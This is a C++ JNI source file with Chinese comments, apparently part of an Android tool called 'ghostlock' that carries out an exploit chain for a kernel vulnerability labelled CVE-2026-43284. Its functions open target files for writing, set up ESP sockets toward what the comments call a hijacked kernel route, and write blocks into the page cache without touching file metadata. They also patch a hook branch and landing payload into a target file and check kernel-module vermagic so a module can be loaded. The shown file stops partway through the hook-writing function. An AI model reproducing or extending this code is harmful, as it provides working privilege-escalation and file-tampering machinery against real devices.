/** @file jni/api_43284_device.cpp
 *  43284 的**数据性**设备缝：本构建自带的字节与钩子计划（不需要设备就能算出来的那部分）。
 *
 *  它们与旧的帧实现（ops_43284_device.cpp）用的是同一批来源：embed 的两张图与 hook 的 sentry 计划，
 *  所以真机上的摘要/数字必须与旧路径逐位一致 —— 门禁正是拿 manifest 里的值对拍。
 *
 *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
 *  设备工作（J7.5 的 43284 链），不在这里。
 */
#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
#include <cstring>
#include <sys/stat.h>
#include <cstddef>
#include <cstdint>
#include <span>
#include <arpa/inet.h>
#include <fcntl.h>
#include <memory>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/lkm/module_facts.hpp"
#include "jni/api_43284.hpp"

namespace ghostlock::jni {
    namespace {

    /**
     *  PathView 是「借用式 ptr + len」，而 half_set() 的定义是 (bytes == nullptr) != (length == 0)：
     *  **非空指针 + 长度 0 也算半给**（access_params.hpp:60-62）。所以空路径必须写成 {nullptr, 0}。
     */
    backend::cve_2026_43284::PathView access_path_of(const std::string &text) noexcept {
        return text.empty() ? backend::cve_2026_43284::PathView{nullptr, 0U}
                            : backend::cve_2026_43284::PathView{text.data(), text.size()};
    }
    /** 已开的门：一个 slot 一个 fd。token = slot + 1（0 留给"没有门"）。 */
    struct OpenDoor final {
        int fd = -1;
        std::string path{};
    };
    constexpr std::size_t kMaxDoors = 8U;
    OpenDoor g_doors[kMaxDoors] = {};
        /** 载荷的落点；缝返回的 span 必须在调用期间有效。 */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;

        bool device_embedded_image(const std::int32_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kImageSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kImageLandingPayload) {
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                    hook::SentryError::Ok) {
                    return false;
                }
                g_payload_size = size;
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
                            std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                 g_payload_size);
            return true;
        }
        /**
         *  按会话的落地装配：门 → 双门对象 → 拼接面 → 窗口 → 落地。
         *
         *  @note RealSpliceIo 与 PageCacheWrite 都不可拷贝，所以整包挂堆上（unique_ptr），与门表同生命周期；
         *        resolve 每次先销毁旧的再建新的。会话真正结束时的销毁需要收尾钩子 —— 当前 API 没有，登记为债。
         */
        struct Landing43284 final {
            backend::cve_2026_43284::landing::PageCacheDoorLinux door;
            backend::cve_2026_43284::landing::RealSpliceIo io;
            backend::cve_2026_43284::landing::PageCacheWrite window;
            backend::cve_2026_43284::landing::PageCacheLanding landing;
            bool up = false;

            /** @param path 载体路径（Kotlin 给） @param sa 会话凭据（Kotlin 给） */
            Landing43284(const char *path, const std::size_t length,
                         const backend::cve_2026_43284::SaMaterial &sa) noexcept
                : door(path, length),
                  io(backend::cve_2026_43284::landing::real_splice_io(), door.open_target()),
                  window(door, io),
                  landing(window) {
                up = door.usable() && landing.bring_up_with(sa);
            }
        };
        std::unique_ptr<Landing43284> g_session;
        /** 设备工作：这个路径现在存在吗。 */
        bool path_exists(const char *path) noexcept {
            struct stat info {};
            return path != nullptr && ::stat(path, &info) == 0;
        }
        /** 设备工作：睡一个轮询间隔。 */
        void sleep_ms(const std::uint32_t ms) noexcept {
            ::usleep(static_cast<useconds_t>(ms) * 1000U);
        }
    }  // namespace

    /**
     *  模块校验：从镜像字节里读出事实，再按内核自己的规则比对 vermagic。纯计算，不需要设备权限，
     *  这正是它能先接线的原因；失败由上层给具名拒绝（module-check-refused）。
     */
    bool device_module_check(const Init43284Values &, const ModuleCheck43284Values &request,
                             void *) noexcept {
        using namespace ghostlock::backend::cve_2026_43284;
        const lkm::ModuleFacts facts =
            lkm::read_module_facts(request.moduleImage.data(), request.moduleImage.size());
        if (!facts.elf_valid || !facts.has_vermagic || facts.vermagic[0] == '\0') {
            /* 不是内核能接受的模块（错 ELF / 没 .modinfo / 没 vermagic）：具名交给上层。 */
            return false;
        }
        const std::string kernel(reinterpret_cast<const char *>(request.kernelVermagic.data()),
                                 request.kernelVermagic.size());
        return lkm::vermagic_matches_kernel(facts.vermagic, kernel.c_str(), facts.has_crcs);
    }

    /**
     *  等终态：在 <moduleName> 指向的文件里找三种 marker 之一，预算内按 pollMs 轮询。
     *
     *  三态都是**真实答案**，不是猜的：找到 successMarker ⇒ success；找到 failureMarker ⇒ failure；
     *  文件不在、或只有 inFlightMarker、或预算用尽 ⇒ inflight。上层据此给 Ok / Failed / InFlight。
     */
    /**
     *  等终态：**复用** steps 里那个实现（wait_for_module），由 native 只提供两件设备工作：
     *  exists 用 stat、sleep_ms 用 usleep。
     *
     *  具名原因到三态的对应（照实现读出来的，不是猜的）：
     *  - nullptr ⇒ Success；
     *  - failure-marker / module-gone ⇒ Failure；
     *  - timeout-while-running（预算用尽仍在跑）⇒ **InFlight**（既非成功也非失败）；
     *  - 时钟没接（no clock）⇒ 也算 Failure —— 那是接线错误，不该发生。
     */
    bool device_wait_terminal(const Init43284Values &, const Wait43284Values &request,
                              TerminalState &terminal, void *) noexcept {
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string success = text_of(request.successMarker);
        const std::string failure = text_of(request.failureMarker);
        const std::string in_flight = text_of(request.inFlightMarker);
        const std::string module_name = text_of(request.moduleName);
        backend::cve_2026_43284::steps::WaitRequest wait{};
        wait.success_marker = success.c_str();
        wait.failure_marker = failure.c_str();
        wait.in_flight_marker = in_flight.c_str();
        wait.module_name = module_name.c_str();
        wait.budget_ms = static_cast<std::uint32_t>(request.budgetMs);
        wait.poll_ms = static_cast<std::uint32_t>(request.pollMs > 0 ? request.pollMs : 10);
        wait.exists = &path_exists;
        wait.sleep_ms = &sleep_ms;
        const char *const reason = backend::cve_2026_43284::steps::wait_for_module(wait);
        if (reason == nullptr) {
            terminal = TerminalState::Success;
            return true;
        }
        terminal = std::strcmp(reason, "step-wait-timeout") == 0 ? TerminalState::InFlight
                                                                   : TerminalState::Failure;
        return true;
    }

    bool device_trigger(const Init43284Values &, const Trigger43284Values &request, void *) noexcept {
        const char *const who = ghostlock::backend::cve_2026_43284::steps::trigger_orphan(
            static_cast<std::uint32_t>(request.delayMs));
        return who == nullptr;
    }

    /**
     *  读回一块：从门那扇 fd 上 pread 十六字节（设备工作）。
     *
     *  @return 读到十六字节为 true；门没开、偏移越界、短读都是 false（上层给 block-read-refused）。
     *  @note 这一半只读**盘上现存的内容**：写还没接线（ESP 路线），所以内容不会等于最近一次写，
     *        状态机因此不会走到 Applied —— 这是如实的，不是缺陷。
     */
    /**
     *  写一块：走落地对象的 land_block（ESP 路线）；成功只到 Dispatched，并把序号往前推。
     *
     *  @return 落地对象不可用、门不对、或 land_block 拒绝时为 false（上层给 block-refused）。
     */
    bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
                            const std::uint64_t door_token, std::uint64_t &sequence,
                            void *) noexcept {
        if (g_session == nullptr || !g_session->up || request.block.size() != 16U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        if (!g_session->landing.land_block(static_cast<std::uint64_t>(request.offset),
                                          request.block.data())) {
            return false;
        }
        sequence += 1U;
        g_session->landing.adopt_sequence(static_cast<std::uint32_t>(sequence));
        return true;
    }

    bool device_read_block(const Init43284Values &, const ReadBlock43284Values &request,
                           const std::uint64_t door_token, const std::span<std::byte> out,
                           void *) noexcept {
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        const ssize_t got = ::pread(g_doors[slot].fd, out.data(), out.size(),
                                    static_cast<off_t>(request.offset));
        return got == static_cast<ssize_t>(out.size());
    }

    backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
        backend::cve_2026_43284::SaMaterial sa{};
        sa.spi = static_cast<std::uint32_t>(params.spi);
        sa.encap_port = static_cast<std::uint16_t>(params.encapPort);
        sa.sender_port = static_cast<std::uint16_t>(params.senderPort);
        sa.icv_len = static_cast<std::uint8_t>(params.icvLength);
        bool any_key_byte = false;
        for (std::size_t index = 0U; index < 32U; ++index) {
            sa.aes_key[index] = params.aesKey.data()[index];
            sa.hmac_key[index] = params.hmacKey.data()[index];
            any_key_byte = any_key_byte || sa.aes_key[index] != 0U || sa.hmac_key[index] != 0U;
        }
        /* 全零密钥不是凭据（与 access_params.hpp 同一条规则）：没有材料，门就不开。 */
        sa.set = any_key_byte;
        return sa;
    }


    /** 关掉一个 slot 上的门（复用 slot 或替换目标时先关）。 */
    void close_door(OpenDoor &door) noexcept {
        if (door.fd >= 0) {
            static_cast<void>(::close(door.fd));
            door.fd = -1;
        }
        door.path.clear();
    }

    /**
     *  开一扇门：以 O_RDWR 打开目标文件，并把 fd 的 slot 编号当 token 交出去。
     *
     *  这是门的第一半（能打开、能读写）；真正让写入"不改文件元数据地落进页缓存"的那一半是 ESP 路线
     *  （write_block / read_block 接 landing 的 land_block/read_block），还没接线 —— 所以现在
     *  写仍然是 block-refused，而不是"看起来写成功了"。
     */
    bool device_resolve(const Init43284Values &params_argv, const ResolveTarget43284Values &request,
                        std::uint64_t &token, void *) noexcept {
        const std::string path(reinterpret_cast<const char *>(request.path.data()), request.path.size());
        if (path.empty()) {
            return false;
        }
        const int fd = ::open(path.c_str(), O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            return false;
        }
        for (std::size_t index = 0U; index < kMaxDoors; ++index) {
            if (g_doors[index].fd < 0) {
                g_doors[index].fd = fd;
                g_doors[index].path = path;
                token = index + 1U;
                /* 门开了就把落地装配建起来：载体路径来自请求，凭据来自会话参数。 */
                g_session.reset();
                g_session = std::make_unique<Landing43284>(
                    path.c_str(), path.size(), sa_material_of(params_argv));
                return true;
            }
        }
        static_cast<void>(::close(fd));
        return false;
    }

    /** 本构建能提供的 43284 缝（其余留空 ⇒ 那些函数以 op-not-wired 具名拒绝）。 */
    DeviceOps43284 device_ops_43284() noexcept {
        DeviceOps43284 ops{};
        ops.embedded_image = &device_embedded_image;
        ops.hook_plan = &device_hook_plan;
        ops.resolve = &device_resolve;
        ops.module_check = &device_module_check;
        ops.read_block = &device_read_block;
        ops.write_block = &device_write_block;
        ops.trigger = &device_trigger;
        ops.wait_terminal = &device_wait_terminal;
        return ops;
    }
    /**
     *  关掉一扇门：按 id 关掉门表里的 fd 并清记录（设备工作；谁开谁关那条规则的执行者）。
     *
     *  @param targetId 由 resolve 给的句柄；0、越界、或本来没开 ⇒ false（上层给 stale-target）。
     *  @note 定义在命名空间层（与头文件声明同层），否则会变成内部链接、Android 链接期找不到。
     */
    bool device_close_target(const std::uint64_t targetId) noexcept {
        if (targetId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(targetId) - 1U;
        if (slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        static_cast<void>(::close(g_doors[slot].fd));
        g_doors[slot].fd = -1;
        g_doors[slot].path.clear();
        return true;
    }

    /**
     *  建 ESP socket：发送端绑 sa.sender_port，连到 sa.encap_port（对端是内核里那条被劫持的路由）。
     *
     *  设备工作（socket/bind/connect）；端口与密钥由会话参数给，本函数不做任何决策。
     *  @return socket fd；失败：-1 没有材料、-2 socket、-3 bind、-4 connect（具名给上层）。
     *  @note 照抄 landing/pagecache_door_linux.cpp 的写法：**非限定**的 sockaddr_in/htons/htonl ——
     *        本 TU 里有 using namespace ghostlock::backend::cve_2026_43284;，带 :: 的限定形式在这里解析失败。
     *        另：SOCK_CLOEXEC 是 Linux 专有，跨平台只用 SOCK_DGRAM。
     */
    int device_connect_esp(const Init43284Values &params) noexcept {
        const backend::cve_2026_43284::SaMaterial sa = sa_material_of(params);
        if (!sa.set) {
            return -1;  /* 没有材料：密钥全零 */
        }
        const int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
            return -2;  /* socket 建不出来 */
        }
        sockaddr_in local{};
        local.sin_family = AF_INET;
        local.sin_port = htons(sa.sender_port);
        local.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(fd, reinterpret_cast<sockaddr *>(&local), sizeof(local)) != 0) {
            static_cast<void>(close(fd));
            return -3;  /* bind 失败（端口被占/无权限） */
        }
        sockaddr_in peer{};
        peer.sin_family = AF_INET;
        peer.sin_port = htons(sa.encap_port);
        peer.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(fd, reinterpret_cast<sockaddr *>(&peer), sizeof(peer)) != 0) {
            static_cast<void>(close(fd));
            return -4;  /* connect 失败 */
        }
        return fd;
    }

    /** @return 关掉一个 socket；fd < 0 则为 false。 */
    bool device_close_socket(const int fd) noexcept {
        if (fd < 0) {
            return false;
        }
        return close(fd) == 0;
    }

    /**
     *  socket 表：connectEsp/espSocketId 建出来的 fd 在这里按不透明 id 存着（谁建谁拆）。
     *
     *  id = slot + 1；0 恒表示没有。
     */
    constexpr std::size_t kMaxSockets = 8U;
    int g_sockets[kMaxSockets] = {-1, -1, -1, -1, -1, -1, -1, -1};

    /**
     *  薄门：只把两个**已经建好**的 fd 交出去（自己不拥有，谁建谁关）。
     *
     *  参考装配里的门（PageCacheDoorLinux）自己开 fd、自己建 socket；这里 fd 与 socket 已经分别由
     *  resolve 与 espSocketId 建好，所以只需一个交出两者的薄对象 —— 拼装顺序由 Kotlin 决定。
     */
    class PairedDoor final : public backend::cve_2026_43284::landing::DoorOps {
      public:
        PairedDoor(const int file_fd, const int socket_fd) noexcept : file_fd_(file_fd), socket_fd_(socket_fd) {}

        [[nodiscard]] int open_target() noexcept override { return file_fd_; }
        [[nodiscard]] int connect_esp(const backend::cve_2026_43284::SaMaterial &) noexcept override {
            return socket_fd_;  /* 已经连好了，这里只交出去 */
        }
        void close_fd(const int) noexcept override { /* 不拥有 fd：由 closeTarget/closeSocket 关 */ }
        [[nodiscard]] bool target_is_remote() const noexcept override { return false; }

      private:
        int file_fd_ = -1;
        int socket_fd_ = -1;
    };

    /** 一个拼接面：薄门 + 真拼接面（写路径的 I/O）。 */
    struct Surface final {
        std::unique_ptr<PairedDoor> door;
        std::unique_ptr<backend::cve_2026_43284::landing::RealSpliceIo> io;
        std::unique_ptr<backend::cve_2026_43284::landing::PageCacheWrite> window;
    };
    constexpr std::size_t kMaxSurfaces = 4U;
    std::unique_ptr<Surface> g_surfaces[kMaxSurfaces];
    std::unique_ptr<backend::cve_2026_43284::landing::PageCacheLanding> g_landings[kMaxSurfaces];

    /**
     *  建 ESP socket 并存表（设备工作：socket/bind/connect）。
     *
     *  @return 不透明 id（slot + 1）；失败 0。端口由会话参数给，本函数不做决策。
     */
    std::uint64_t device_esp_socket_id(const Init43284Values &params, int &why) noexcept {
        why = 0;
        const int fd = device_connect_esp(params);
        if (fd < 0) {
            why = fd;  /* 把失败原因原样带出去：-1 没有材料、-2 socket、-3 bind、-4 connect */
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxSockets; ++index) {
            if (g_sockets[index] < 0) {
                g_sockets[index] = fd;
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        static_cast<void>(device_close_socket(fd));
        why = -9;  /* 表满 */
        return 0U;
    }

    /** @return 同上，但不带失败原因。 */
    std::uint64_t device_esp_socket_id(const Init43284Values &params) noexcept {
        int why = 0;
        return device_esp_socket_id(params, why);
    }

    /** @return 按 id 关掉 socket；0/越界/未开 ⇒ false。 */
    bool device_close_socket_id(const std::uint64_t socketId) noexcept {
        if (socketId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(socketId) - 1U;
        if (slot >= kMaxSockets || g_sockets[slot] < 0) {
            return false;
        }
        const bool closed = device_close_socket(g_sockets[slot]);
        g_sockets[slot] = -1;
        return closed;
    }

    /**
     *  建一个拼接面：把门表里的 fd 与 socket 表里的 socket 配成一个薄门，再包上真拼接面。
     *
     *  @return 不透明 id（slot + 1）；失败 0。
     */
    std::uint64_t device_make_surface(const std::uint64_t targetId,
                                      const std::uint64_t socketId) noexcept {
        if (targetId == 0U || socketId == 0U) {
            return 0U;
        }
        /*
         * targetId 是**票据**（(门句柄 << 32) | 代）：门句柄 = slot + 1，所以下标是 (targetId >> 32) - 1。
         * 这是 2026-10-15 真机 surface-refused 的真因 —— 早先把它当成 slot + 1 直接减一，解出来的下标是错的。
         */
        const std::size_t target_slot = static_cast<std::size_t>(targetId >> 32U) - 1U;
        const std::size_t socket_slot = static_cast<std::size_t>(socketId) - 1U;
        if (target_slot >= kMaxDoors || g_doors[target_slot].fd < 0) {
            return 0U;
        }
        if (socket_slot >= kMaxSockets || g_sockets[socket_slot] < 0) {
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxSurfaces; ++index) {
            if (g_surfaces[index] == nullptr) {
                auto surface = std::make_unique<Surface>();
                surface->door = std::make_unique<PairedDoor>(g_doors[target_slot].fd, g_sockets[socket_slot]);
                surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
                    backend::cve_2026_43284::landing::real_splice_io(), g_doors[target_slot].fd);
                g_surfaces[index] = std::move(surface);
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        return 0U;
    }

    /** @return 拆掉一个拼接面（同时拆掉它的落地对象，如果有）。 */
    bool device_destroy_surface(const std::uint64_t surfaceId) noexcept {
        if (surfaceId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr) {
            return false;
        }
        g_landings[slot].reset();
        g_surfaces[slot].reset();
        return true;
    }

    /**
     *  按拼接面建落地对象（借它的窗口）。
     *
     *  @return 不透明 id（slot + 1）；没有拼接面或已建过 ⇒ 0。
     */
    std::uint64_t device_make_landing(const std::uint64_t surfaceId) noexcept {
        if (surfaceId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr || g_landings[slot] != nullptr) {
            return 0U;
        }
        auto window = std::make_unique<backend::cve_2026_43284::landing::PageCacheWrite>(
            *g_surfaces[slot]->door, *g_surfaces[slot]->io);
        /* 窗口必须比落地对象活得久：把窗口也挂在 surface 上。 */
        g_surfaces[slot]->window = std::move(window);
        g_landings[slot] = std::make_unique<backend::cve_2026_43284::landing::PageCacheLanding>(
            *g_surfaces[slot]->window);
        return static_cast<std::uint64_t>(slot) + 1U;
    }

    /** @return 拆掉落地对象；没有则为 false。 */
    bool device_destroy_landing(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        g_landings[slot].reset();
        return true;
    }

    /**
     *  用会话参数的材料把落地对象拉起来（bring_up_with）。参数（密钥/端口/ICV）由 Kotlin 给。
     *
     *  @return 起来了 true；id 无效、没建过、或材料不全 ⇒ false。
     */
    bool device_bring_up(const std::uint64_t landingId, const Init43284Values &params) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        return g_landings[slot]->bring_up_with(sa_material_of(params));
    }

    /** @return 窗口的下一个序号；id 无效 ⇒ 0。序号策略（用不用、用哪个）由 Kotlin 决定。 */
    std::uint64_t device_next_sequence(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr || g_surfaces[slot]->window == nullptr) {
            return 0U;
        }
        return static_cast<std::uint64_t>(g_surfaces[slot]->window->next_seq());
    }

    /** 让落地对象采用下一个序号（跨窗口接续也走这里）。 */
    bool device_adopt_sequence(const std::uint64_t landingId, const std::uint64_t next) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        g_landings[slot]->adopt_sequence(static_cast<std::uint32_t>(next));
        return true;
    }

    /**
     *  往落地对象写一块（十六字节）：ESP 路线的写入口。
     *
     *  @return 写成功 true（只到 Dispatched；内容是否真落上由随后 read_block 比较判定）。
     */
    bool device_land_block(const std::uint64_t landingId, const std::uint64_t offset,
                           const std::uint8_t *block) noexcept {
        if (landingId == 0U || block == nullptr) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        return g_landings[slot]->land_block(offset, block);
    }

    /**
     *  从落地对象读回一块（十六字节）：走同一个窗口的读路径，与写回的原文比较用。
     *
     *  @return 整读成功 true。
     */
    bool device_read_landing_block(const std::uint64_t landingId, const std::uint64_t offset,
                                   std::uint8_t *out) noexcept {
        if (landingId == 0U || out == nullptr) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        return g_landings[slot]->read_block(offset, out);
    }

    /** Access 表：按拼接面/落地对象建出来的 Access 在这里按不透明 id 存着（谁建谁拆）。 */
    constexpr std::size_t kMaxAccesses = 4U;
    std::unique_ptr<backend::cve_2026_43284::Access> g_accesses[kMaxAccesses];

    /**
     *  建一个 Access：它借用落地对象（必须比它活得久）。
     *
     *  @return 不透明 id（slot + 1）；没有落地对象或表满 ⇒ 0。
     */
    std::uint64_t device_make_access(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxAccesses; ++index) {
            if (g_accesses[index] == nullptr) {
                g_accesses[index] = std::make_unique<backend::cve_2026_43284::Access>(g_landings[slot].get());
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        return 0U;
    }

    /** @return 拆掉一个 Access（它只借用落地对象，所以拆它不动别人）。 */
    bool device_destroy_access(const std::uint64_t accessId) noexcept {
        if (accessId == 0U) {
            return -1;  /* 没有句柄 */
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return -2;  /* 句柄失效 */
        }
        g_accesses[slot].reset();
        return true;
    }

    /**
     *  初始化 Access（驱动器里 patch_access.initialize(params) 的那一步）。
     *
     *  @note 生成的 Values 在 contract 子命名空间里；PathView 是借用式，三个路径的 std::string 必须活到调用结束，
     *        所以它们都在本栈帧里。
     *  @return 成功 true；id 无效或 Access 拒绝 ⇒ false（上层给 access-initialize-refused）。
     */
    int device_access_initialize(const std::uint64_t accessId,
                                 const contract::AccessParams43284Values &values,
                                 const Init43284Values &sa_source) noexcept {
        if (accessId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(values.accessCarrierPath);
        const std::string dev_carrier = text_of(values.accessDevCarrierPath);
        const std::string patch_target = text_of(values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams params{};
        params.carrier = access_path_of(carrier);
        params.dev_carrier = access_path_of(dev_carrier);
        params.patch_target = access_path_of(patch_target);
        params.carrier_base = static_cast<std::uint64_t>(values.accessCarrierBase);
        params.offset = static_cast<std::uint64_t>(values.accessOffset);
        params.offset_set = values.accessOffsetSet;
        /*
         * Access::initialize 自己会 bring_up_with（并接续序号），所以材料必须随它一起给；
         * 而 PageCacheLanding::bring_up_with 在「已拉起」时会返回 false —— 走这条路就不能先单独 bringUp。
         */
        params.sa = sa_material_of(sa_source);
        const auto up = g_accesses[slot]->initialize(params);
        /* 状态码原样带出去：bad-parameters 与 failed 是两条完全不同的路，不许压成 bool。 */
        return up.ok() ? 0 : static_cast<int>(up.status);
    }

    /**
     *  把一个镜像写进载体并逐块校验（驱动器里 steps::write_image_verified 的那一步，patch#1 用的就是它）。
     *
     *  @param values 生成的 Values（在 contract 里）：accessId/offset/width/bytes 全由 Kotlin 给。
     *  @param params 同一份 AccessParams（借用式路径只在调用期有效）。
     *  @return 全部块写完并校验通过 true；否则 false（上层给 image-write-refused）。
     */
    bool device_write_image(const contract::WriteImage43284Values &values,
                           const contract::AccessParams43284Values &params_values) noexcept {
        const std::uint64_t access_id = static_cast<std::uint64_t>(values.imageAccessId);
        if (access_id == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(access_id) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(params_values.accessCarrierPath);
        const std::string dev_carrier = text_of(params_values.accessDevCarrierPath);
        const std::string patch_target = text_of(params_values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams access_params{};
        access_params.carrier = access_path_of(carrier);
        access_params.dev_carrier = access_path_of(dev_carrier);
        access_params.patch_target = access_path_of(patch_target);
        access_params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
        access_params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
        access_params.offset_set = params_values.accessOffsetSet;
        backend::cve_2026_43284::steps::WriteRequest request{};
        request.access = g_accesses[slot].get();
        request.params = &access_params;
        request.image = std::span<const std::byte>(
            reinterpret_cast<const std::byte *>(values.imageBytes.data()), values.imageBytes.size());
        request.offset = static_cast<std::uint64_t>(values.imageOffset);
        request.width = static_cast<std::uint64_t>(values.imageWidth);
        const char *refusal = nullptr;
        return backend::cve_2026_43284::steps::write_image_verified(request, &refusal);
    }

    /**
     *  写钩子（站点一个字 + landing 载荷）：驱动器里 steps::write_hook 的那一步。
     *
     *  计划用设备侧既有那张（与 device_hook_plan 同源）；access/params/宽度由 Kotlin 给。
     *  @return 写完并校验 true；否则 false（上层给 hook-write-refused）。
     */
    bool device_write_hook(const contract::WriteHook43284Values &values,
                           const contract::AccessParams43284Values &params_values) noexcept {
        const std::uint64_t access_id = static_cast<std::uint64_t>(values.hookAccessId);
        if (access_id == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(access_id) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return false;
        }
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string carrier = text_of(params_values.accessCarrierPath);
        const std::string dev_carrier = text_of(params_values.accessDevCarrierPath);
        const std::string patch_target = text_of(params_values.accessPatchTargetPath);
        backend::cve_2026_43284::AccessParams access_params{};
        access_params.carrier = access_path_of(carrier);
        access_params.dev_carrier = access_path_of(dev_carrier);
        access_params.patch_target = access_path_of(patch_target);
        access_params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
        access_params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
        access_params.offset_set = params_values.accessOffsetSet;
        const backend::cve_2026_43284::hook::SentryPlan plan =
            backend::cve_2026_43284::hook::device_sentry_plan();
        backend::cve_2026_43284::steps::HookRequest request{};
        request.access = g_accesses[slot].get();
        request.params = &access_params;
        request.plan = &plan;
        request.width = static_cast<std::uint64_t>(values.hookWidth);
        const char *refusal = nullptr;
